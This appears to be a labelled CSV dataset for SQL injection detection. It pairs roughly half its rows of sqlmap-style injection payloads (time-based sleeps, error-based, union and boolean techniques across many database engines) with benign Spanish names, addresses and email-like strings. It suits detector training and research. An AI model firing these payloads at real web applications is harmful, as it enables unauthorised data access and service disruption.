Query,Label
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'yvxg'='yvxg,1
santiago de la puebla,0
antai,0
"1"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""ypoj""=""ypoj",1
"-8608"" or 5460=4461--",1
"-8200' where 3422=3422 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
parnesi3,0
31560,0
1') as twny where 9580=9580;begin dbms_lock.sleep(5); end--,1
59di51ca1,0
las palmeras 91 5b,0
"1,iif(6625=6625,1,1/0)",1
05190,0
"macario, 87,",0
le?gionario,0
norberto,0
"oso, el",0
43511,0
"pl. santa isabel s/n, 8-d",0
60106679c,0
pizzanel,0
zeng,0
vallb olmos,0
9978092999259297,0
"las delicias 20,",0
indemira,0
mudie,0
37244804f,0
wolbert.navin@cirugiaalbeiteria.nu,0
"1"") as fkgs where 5948=5948 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"plza. jose palmis 179,",0
"cardenal mendoza s/n, 7?h",0
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))-- dkwz",1
-8665' or 6825=7840 and 'vbsy' like 'vbsy,1
torcuarto,0
"1%')) union all select null,null,null,null--",1
27306256n,0
"plaa de margarida xirgu 141, 2h",0
borracho,0
"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",1
remo,0
6121365584311454,0
calle san juan 151 1e,0
martens,0
"1"") as kdvb where 2651=2651 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",1
zlotnick,0
40574017q,0
0777026292170424,0
charpini_daillie@inmobiliariahangar.ly,0
solicitador,0
"-1559 union all select 3985,3985,3985,3985#",1
gorius,0
1'))) and (select * from (select(sleep(5)))fzno) and ((('yctp'='yctp,1
"1""))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((""mmsh""=""mmsh",1
18513875w,0
-6412%' or 4065=5815 and '%'=',1
bollullos de la mitacin,0
1' and (select * from (select(sleep(5)))fzno) and 'gpax'='gpax,1
carmena,0
"talavera 56,",0
"1;select count(*) from generate_series(1,5000000)-- gqkk",1
gelo,0
"1' in boolean mode) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",1
1%')) and (select * from (select(sleep(5)))fzno) and (('%'=',1
c35iz3,0
"(extractvalue(1759,concat(0x5c,0x7171706a71,(select (elt(1759=1759,1))),0x717a767a71)))",1
16140,0
3991,0
33693,0
de tena leguizamn,0
butalov0@lettere.dm,0
0esh6red32,0
"-9496))) or elt(7511=3951,3951) and (((3514=3514",1
11295198j,0
abrucena,0
badosa estruch,0
45840,0
"1"" rlike sleep(5) and ""rylv"" like ""rylv",1
ralina,0
0683879802529946,0
rio bullaque 65,0
"1%') or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
peller@arvigar.gs,0
80047732g,0
nedra,0
"1%"" and make_set(2905=5725,5725) and ""%""=""",1
1');begin dbms_lock.sleep(5); end--,1
candombe,0
"-6085 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",1
toro,0
19310,0
03153,0
"calle santa barbara, 17 7c",0
saetero farrer,0
5011187157349121,0
"-3868')) or make_set(6809=1236,1236) and (('evnj'='evnj",1
"1"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""uvvy"" like ""uvvy",1
sothern@asesoriaviesca.nc,0
ravinder,0
"1"")) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""vypw"" like ""vypw",1
"o casal 135, 4?a",0
sant juli de ramis,0
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",1
6615,0
valma,0
"camino del caliero, 75",0
"-6970"")) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""dyrq"" like ""dyrq",1
4796381600285073,0
orieta,0
convento de las dueas 86,0
"-4641"") where 4212=4212 or make_set(3595=4062,4062)--",1
haynor,0
15953,0
"1"") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--",1
calle cierzo 126,0
rabs,0
ellul0,0
"calle oroya 191,",0
"-7236 or make_set(9618=6919,6919)",1
3849,0
calle rafael villa 41,0
"-7858') union all select 1541,1541,1541,1541,1541,1541#",1
herguijuela del campo,0
villoresi@n340magazin.tc,0
bahabn de esgueva,0
"1"" where 7599=7599;begin user_lock.sleep(5); end--",1
3218,0
fernn caballero,0
bond@tomorrow.com.hk,0
1');select pg_sleep(5) and ('vnss' like 'vnss,1
1)) as pzoo where 8036=8036 or 6793=(select 6793 from pg_sleep(5))--,1
-4313%') or 6872=6872 and ('%'=',1
"1)) as nnpe where 9720=9720 union all select null,null,null,null,null,null,null,null,null#",1
valcarcel,0
1u1tro,0
"1'+(select 'bztp' where 2541=2541 union all select null,null,null,null,null,null,null,null,null,null--",1
23978164c,0
patenaud,0
benji,0
"1""))) rlike (select * from (select(sleep(5)))sgvo) and (((""sdps""=""sdps",1
1940,0
9302322356246829,0
"1"")) and 8594=(select 8594 from pg_sleep(5))--",1
"-7531') union all select 3072,3072,3072,3072,3072,3072,3072--",1
83,0
5v1s582a,0
1)) or (select * from (select(sleep(5)))sddo)#,1
resve7,0
22496795n,0
majagua,0
poulsen,0
"camino torrecilla, 42,",0
"1%"" and elt(4249=4249,7259) and ""%""=""",1
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('yznn' like 'yznn",1
poma bolet,0
"1' in boolean mode);call regexp_substring(repeat(right(char(3702),0),500000000),null)#",1
pupinyo@multaspendientes.ve,0
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""eslj"" like ""eslj",1
"1' where 5786=5786 and elt(1210=1210,sleep(5))--",1
02153,0
leiding@ubuybetter.cat,0
tebbe,0
bride,0
5070501276663711,0
rodern,0
51517640d,0
siku@tartasconamor.in,0
nina,0
"1)) as xovu where 4530=4530 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
gabriele,0
"-4028) where 3244=3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",1
cardias,0
de asbaje abarzuza,0
"1"" where 3678=3678 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",1
rib cruanas,0
33555,0
42010181z,0
"calle juana ibarborou 134,",0
humfrid,0
6741,0
2787973107257855,0
75834762j,0
bazet aguil,0
4at4pln,0
p5nderativa,0
"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",1
fabiano,0
39806,0
jefferson-kuznezov@productosgarantizados.bb,0
castildelgado,0
1');select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
07485924e,0
vargas bentos,0
"1%"";iif(1878=2513,1,1/0)",1
"1%')) union all select null,null,null,null,null,null,null,null#",1
corvera de asturias,0
"1' where 9602=9602;select benchmark(5000000,md5(0x4c4d6142))--",1
"1')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('ctbs' like 'ctbs",1
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('bacm'='bacm",1
05619,0
"1%"";select (case when (3855=3855) then 3855 else 1/(select 0) end)--",1
"1%"";select (case when (7019=1998) then 7019 else 7019*(select 7019 from mysql.db) end)#",1
69557398q,0
"1'+(select tvpj where 7058=7058 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",1
cagarria,0
dahlke8@elviajehacomenzado.sv,0
valleseco,0
zens-trebaol6@gesautonomos.rw,0
samanieg mitteenn,0
"1)) as cvid where 4381=4381 union all select null,null--",1
1646619450025550,0
konstanc,0
"1"") as ltoa where 9159=9159 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1
kaitlynn,0
7549,0
babuchera,0
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",1
mestizo,0
aineln,0
esbarar,0
"-8436') as frmf where 7225=7225 or make_set(9354=9354,7185)--",1
93026638x,0
66564863b,0
acedera,0
dasonmica,0
1'||(select 'pcps' from dual where 7255=7255 and 7121=4603,1
"charca verde 165,",0
02649,0
graff@manzanilladevillafafila.iq,0
-7435') where 6242=6242 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1
"-9098'||(select 'xodn' from dual where 8202=8202 union all select 8202,8202,8202,8202,8202,8202,8202--",1
zayas vadillo,0
"1"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""wjhj""=""wjhj",1
"-2226%"")) union all select 1018,1018,1018,1018--",1
boci+o,0
1))) union all select null#,1
1%' union all select null--,1
"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",1
keseris,0
08181,0
-7951'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('blak'='blak,1
lonald8,0
-3499'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('nzap' like 'nzap,1
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""woun"" like ""woun",1
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",1
08tiro72,0
"1') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
lacivo,0
"-9087"" order by 1#",1
2719,0
porras roger,0
1' where 4473=4473 and (select * from (select(sleep(5)))gcrr)#,1
"pantano piedraaguda s/n, 12-d",0
cer97708or7,0
currey99,0
katy,0
cehegn,0
1'+(select 'ohdf' where 7878=7878 and 5678=3277--,1
"ondulada, 121",0
5170755929650123,0
"calle francisco gervas, 174, 9h",0
06a45s3s,0
fulmer,0
"calle espio, 120, 11?a",0
57584234p,0
"calle vicente seixo 182,",0
1')) as oyad where 7161=7161 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,1
dungan,0
2nd2y19i78b4e,0
"c/ echegaray s/n,",0
6733674859620328,0
1) where 3979=3979 rlike sleep(5)--,1
26256,0
"1))) and elt(4249=4249,7259) and (((5030=5030",1
1)) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((9452=9452,1
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
44132,0
dinaband,0
fiodorov@contactomujeres.kr,0
2812,0
"general bravo, 189,",0
7ra0sp64t9r,0
sikes-jeans@923.mv,0
"1"") where 3958=3958 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
"1)));select count(*) from generate_series(1,5000000) and (((1321=1321",1
"-4300"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""klbu""=""klbu",1
3981394476898730,0
"elt(5953=5953,1)",1
49181,0
"1%"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""%""=""",1
"1%') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('%'='",1
0639487553835350,0
bidart-halton@monnal.tel,0
leonel,0
-9363%' or (8459=8459)*4906 and '%'=',1
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('nimx'='nimx",1
"calle poador, 65 3a",0
olimpia,0
disimtrico,0
"-8325)) as ajxq where 6630=6630 union all select 6630,6630,6630,6630,6630,6630--",1
"1')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('mymg'='mymg",1
stovin@escuelamontessori.zr,0
c356conio,0
rhys,0
vin,0
dennis,0
-6488' or 5164=9234,1
6142057551987686,0
jaspe ochoa,0
conroy7,0
842is2n,0
"1)) union all select null,null,null,null,null#",1
villena,0
5639,0
rolanda,0
perafort,0
elysee,0
49511678s,0
-3956') or (8459=8459)*4906 and ('rflo' like 'rflo,1
8590730598040371,0
chanchla,0
aparencia,0
franks.merayo@karldeux.ki,0
"1"") where 1410=1410;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
"plaa cesar vallejo, 58",0
slartiba,0
tapinga,0
michigan,0
1 or sleep(5)# tdgb,1
dorra,0
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",1
-8753) order by 1#,1
1') where 6842=6842;begin dbms_lock.sleep(5); end--,1
"1"") where 2312=2312 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
9029322975173730,0
-3088' or 6872=6872 and 'miwk'='miwk,1
33652854j,0
aparicio andreu,0
"-4015"" where 2610=2610 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1')) and make_set(3793=8118,8118) and (('swvc' like 'swvc",1
torre val de san pedro,0
25723,0
stoffels3,0
janga7a,0
1');select sleep(5) and ('hhlq' like 'hhlq,1
"1""))) and elt(1750=7826,7826) and (((""qcro""=""qcro",1
ethan,0
de jaime,0
"calle antequeruela, 94, 7-a",0
"1'||(select 'bgdh' from dual where 1967=1967;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
merkling,0
-4617'))) or 9323=9323#,1
"1'+(select dagm where 5461=5461 or 8466=benchmark(5000000,md5(0x694a4745)))+'",1
de jongh algarra,0
puigpunyent,0
"1"" where 4597=4597 rlike sleep(5)--",1
"1%"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""%""=""",1
"-6236'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1%';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'='",1
"1"") where 5850=5850 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
thayra,0
dionysia,0
"1' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
"1"")) as hwlh where 1071=1071 union all select null,null,null,null,null,null,null,null#",1
"1 where 1326=1326 union all select null,null,null,null,null,null--",1
m941onaria,0
"carrer asturies, 49",0
corsini-vischer@viajesdacapalla.nl,0
gilbuena,0
repuesta,0
arjona,0
10739,0
"codigo postal para tele 5, 63 13g",0
"1%"")));select * from generate_series(9964,9964,case when (9964=4455) then 1 else 0 end) limit 1--",1
7580,0
"1') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1"" and 6637=2321",1
5he1un,0
"1') union all select null,null,null,null,null,null,null,null--",1
kirkley9,0
g5adae3a,0
20110,0
queral queral,0
gelber serarols,0
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ckpm'='ckpm",1
51975226x,0
ot5ora,0
26246248m,0
1'+(select tzvm where 5145=5145 and 4192=7437#,1
ro3eral,0
"1',(case when 5204=2136 then 1 else null end)",1
44ap25a,0
luna,0
"1')) as mjps where 2179=2179 union all select null,null,null,null,null,null,null--",1
63545647m,0
"1%')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('%'='",1
"c/ francisco de ricci 23, 1?c",0
1';begin user_lock.sleep(5); end and 'hizd'='hizd,1
pineda trasmonte,0
del nuevo mundo s/n,0
5763287543160416,0
47400,0
"1"") and 2006=2006",1
pacfica,0
*ayustar,0
"1'+(select vvet where 5221=5221 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'",1
"-4418"" or 6872=6872 and ""gbut""=""gbut",1
frankeur@tardos.pro,0
busqu,0
lacruz morey,0
rinaldi albiol,0
5728310223960582,0
7stambrar,0
c/ agachadilla 81,0
"1%"")) or 4240=(select 4240 from pg_sleep(5))--",1
42782721f,0
aylmar6,0
elex,0
"-6632) union all select 4073,4073,4073,4073,4073,4073,4073,4073--",1
25727,0
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and 'hqqj'='hqqj",1
keaton3,0
r8cid0va,0
-4775') or 3038=3038,1
16300,0
"c/ cangrexeiras, 164, 4e",0
jande,0
1'+(select 'hplm' where 4008=4008 and 8594=(select 8594 from pg_sleep(5))--,1
49694,0
22122,0
"1"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""nobt""=""nobt",1
"1"");select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1
pavn taracena,0
"1) where 9213=9213 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
sarfati@weat.nc,0
lock,0
clipsham5,0
"1'+(select oqvo where 7448=7448 union all select null,null,null,null,null--",1
wackernagel@tiendasyofertas.je,0
sonne,0
"-1985%'))) union all select 3051,3051,3051--",1
"glorieta musico emilio alvarez anton 153,",0
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('cimm' like 'cimm",1
maila,0
-4428) or 3038=3038,1
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'ctac' like 'ctac",1
"1')) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
cecil.wolcott7@librodeapuntes.sv,0
"1') where 3271=3271 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1"") or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""vnso"" like ""vnso",1
48748000y,0
28782294w,0
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""oyfk""=""oyfk",1
